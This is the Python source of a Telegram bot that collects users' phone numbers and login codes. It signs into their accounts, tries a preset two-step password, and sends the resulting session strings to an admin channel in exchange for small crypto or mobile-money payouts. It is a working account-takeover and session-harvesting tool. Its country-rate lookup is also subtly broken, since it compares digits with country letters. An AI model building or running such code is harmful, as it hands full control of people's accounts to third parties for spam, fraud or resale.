import asyncio
import json
import os
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError

from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, ADMIN_ID, SESSION_2FA_PASSWORD


# Initialize Pyrogram bot client
app = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

# Data holders
user_data = {}
sessions = {}
state = {}

DATA_FILE = "data.json"

# Load saved user data
def load_data():
    global user_data
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            user_data = json.load(f)
    else:
        user_data = {}

# Save user data to file
def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(user_data, f, indent=4)

# Country based rates (adjust as needed)
country_rates = {
    "BD": 0.25,
    "IN": 0.20,
    "PK": 0.22,
    "ID": 0.23,
}

load_data()


@app.on_message(filters.command("start") & filters.private)
async def start(_, msg):
    user_id = str(msg.from_user.id)
    if user_id not in user_data:
        user_data[user_id] = {
            "id": msg.from_user.id,
            "success": 0,
            "balance": 0.0,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_data()

    state[user_id] = "awaiting_phone"
    await msg.reply(
        """🎉 Welcome to Robot!

Enter your phone number with the country code.
Example: +62xxxxxxx

Type /cap to see available countries.""",
        reply_markup=ReplyKeyboardMarkup(
            [["✅ Restart", "🌐 Capacity"],
             ["🎰 Check - Balance"],
             ["💸 Withdraw Accounts"],
             ["🆘 Need Help?"]],
            resize_keyboard=True
        )
    )


@app.on_message(filters.command("cap") & filters.private)
async def cap(_, msg):
    text = "🌐 Available Countries:\n"
    for c, p in country_rates.items():
        text += f"🔹 {c}: ${p}\n"
    await msg.reply(text)


@app.on_message(filters.command("account") & filters.private)
async def account(_, msg):
    user_id = str(msg.from_user.id)
    d = user_data.get(user_id, {})
    await msg.reply(
        f"🎫 Your user account in the robot:\n\n"
        f"👤 ID: {d.get('id')}\n"
        f"🥅 Total success accounts: {d.get('success')}\n"
        f"💰 Your balance: ${d.get('balance'):.2f}\n"
        f"⏰ Joined at: {d.get('joined')}"
    )


@app.on_message(filters.command("withdraw") & filters.private)
async def withdraw(_, msg):
    user_id = str(msg.from_user.id)
    d = user_data.get(user_id, {})
    await msg.reply(
        f"🎫 Your user account in the robot:\n\n"
        f"👤 ID: {d.get('id')}\n"
        f"🥅 Total success accounts: {d.get('success')}\n"
        f"💰 Your balance: ${d.get('balance'):.2f}\n"
        f"⏰ Joined at: {d.get('joined')}\n\n"
        f"💵 Choose withdrawal method:",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("💳 USDT (BEP20)", callback_data="withdraw_usdt")],
                [InlineKeyboardButton("💸 TRX", callback_data="withdraw_trx")],
                [InlineKeyboardButton("📱 BKASH", callback_data="withdraw_bkash")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu")]
            ]
        )
    )


@app.on_callback_query()
async def callback(_, query):
    user_id = str(query.from_user.id)
    d = user_data.get(user_id, {})

    # Handle withdraw callbacks
    if query.data.startswith("withdraw_"):
        option = query.data.split("_")[1].upper()
        await query.answer(f"Withdraw request via {option} received!")
        await query.message.reply(f"✅ Withdraw request submitted via {option}.")
        await app.send_message(
            CHAT_ID:=CHANNEL_ID,
            f"💸 Withdraw Report:\n\n"
            f"👤 User ID: {d.get('id')}\n"
            f"💰 Amount: ${d.get('balance'):.2f}\n"
            f"💳 Method: {option}\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        # Reset balance after withdraw
        d["balance"] = 0.0
        save_data()
    elif query.data == "menu":
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🌐 Capacity", callback_data="cap")],
                [InlineKeyboardButton("🎰 Check - Balance", callback_data="account")],
                [InlineKeyboardButton("💸 Withdraw Accounts", callback_data="withdraw")],
                [InlineKeyboardButton("🆘 Need Help?", callback_data="support")]
            ]
        )
        await query.message.edit_text("📲 Choose an option:", reply_markup=keyboard)
    elif query.data == "cap":
        text = "🌐 Available Countries:\n"
        for c, p in country_rates.items():
            text += f"🔹 {c}: ${p}\n"
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu")]]))
    elif query.data == "account":
        d = user_data.get(user_id, {})
        text = (
            f"🎫 Your user account in the robot:\n\n"
            f"👤 ID: {d.get('id')}\n"
            f"🥅 Total success accounts: {d.get('success')}\n"
            f"💰 Your balance: ${d.get('balance'):.2f}\n"
            f"⏰ Joined at: {d.get('joined')}"
        )
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu")]]))
    elif query.data == "withdraw":
        d = user_data.get(user_id, {})
        text = (
            f"🎫 Your user account in the robot:\n\n"
            f"👤 ID: {d.get('id')}\n"
            f"🥅 Total success accounts: {d.get('success')}\n"
            f"💰 Your balance: ${d.get('balance'):.2f}\n"
            f"⏰ Joined at: {d.get('joined')}\n\n"
            f"💵 Choose withdrawal method:"
        )
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("💳 USDT (BEP20)", callback_data="withdraw_usdt")],
                [InlineKeyboardButton("💸 TRX", callback_data="withdraw_trx")],
                [InlineKeyboardButton("📱 BKASH", callback_data="withdraw_bkash")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu")]
            ]
        )
        await query.message.edit_text(text, reply_markup=keyboard)
    elif query.data == "support":
        await query.message.edit_text(
            f"🆘 For help, contact: @xrd_didox",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu")]])
        )


@app.on_message(filters.command("support") & filters.private)
async def support(_, msg):
    await msg.reply("🆘 Contact support: @xrd_didox")


@app.on_message(filters.text & filters.private)
async def handle_input(_, msg):
    user_id = str(msg.from_user.id)

    # Awaiting phone number from user
    if state.get(user_id) == "awaiting_phone":
        phone = msg.text.strip()
        if not phone.startswith("+") or len(phone) < 8:
            await msg.reply("❌ Please send a valid phone number with country code (e.g. +1234567890).")
            return

        sessions[user_id] = {"phone": phone}
        await msg.reply("📨 Sending OTP...")
        asyncio.create_task(send_otp(user_id, msg))
        state[user_id] = "awaiting_code"

    # Awaiting OTP code from user
    elif state.get(user_id) == "awaiting_code":
        code = msg.text.strip()
        sessions[user_id]["code"] = code
        await msg.reply("⏳ Verifying your code, please wait...")
        await verify_session(user_id, msg)


async def send_otp(user_id, msg):
    phone = sessions[user_id]["phone"]
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        sessions[user_id]["client"] = client
        await msg.reply("📩 OTP sent. Please enter the code:")
    except PhoneNumberInvalidError:
        await msg.reply("❌ Invalid phone number.")
        state[user_id] = None


async def verify_session(user_id, msg):
    code = sessions[user_id]["code"]
    client: TelegramClient = sessions[user_id]["client"]
    phone = sessions[user_id]["phone"]

    try:
        await client.sign_in(phone, code)
    except SessionPasswordNeededError:
        await client.sign_in(password=SESSION_2FA_PASSWORD)

    # Save session string
    session_str = client.session.save()
    filename = f"session_{user_id}.session"
    with open(filename, "w") as f:
        f.write(session_str)

    # Send session file to admin channel
    await app.send_document(CHANNEL_ID, filename, caption=f"✅ Session for {phone}")

    # Remove local session file after sending
    os.remove(filename)

    await msg.reply("✅ Your account has been verified and session saved!")

    # Update user stats
    user_data[user_id]["success"] += 1

    # Calculate country from phone for balance update
    country_code = phone[1:3].upper()
    rate = country_rates.get(country_code, 0.20)
    user_data[user_id]["balance"] += rate

    save_data()

    # Disconnect client and reset state
    await client.disconnect()
    state[user_id] = None


if __name__ == "__main__":
    print("Bot is starting...")
    app.run()

